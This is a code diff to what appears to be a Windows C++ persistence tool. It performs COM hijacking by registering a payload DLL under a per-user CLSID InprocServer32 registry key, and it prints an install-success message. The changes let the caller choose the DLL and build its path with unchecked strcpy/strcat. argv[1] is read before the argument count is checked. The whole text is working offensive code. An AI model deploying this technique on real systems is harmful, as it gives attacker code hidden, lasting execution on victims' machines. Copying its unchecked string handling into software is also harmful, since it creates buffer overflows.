@@ -4,14 +4,14 @@ int main(int argc, char* argv[])
 {
 	string type = argv[1];
 	if (argc > 1) {
-
+		string target_file;
 		if (argc >= 3)
 		{
-
+			target_file = argv[2];
 		}
 		else
 		{
-
+			target_file = "demo_dll.dll";
 		}
 		HKEY hKey;
 		DWORD dwDisposition; 
@@ -19,12 +19,12 @@ int main(int argc, char* argv[])
 		char payload_path[MAX_PATH] = { 0 };
 		char threading_model[] = "Apartment";
 		ExpandEnvironmentStringsA("%APPDATA%Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}", folder_path, MAX_PATH);
-		ExpandEnvironmentStringsA("%APPDATA%Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E\\demo_dll.dll}", payload_path, MAX_PATH);
+		strcpy(payload_path, folder_path);
+		strcat(payload_path, "\\");
+		strcat(payload_path, target_file.c_str());
 		if ("-install" == type)
 		{
-			string command;
-			command = "mkdir -p " + string(folder_path);
-			system(command.c_str());
+			CreateDirectoryA(folder_path, NULL);
 			if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
 				"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
 			{
@@ -43,7 +43,7 @@ int main(int argc, char* argv[])
 			}
 			printf("com hijacking install success!\r\n");
 		}
-		if ("-uninstall" == type)
+		else if ("-uninstall" == type)
 		{
 			if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
 				"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
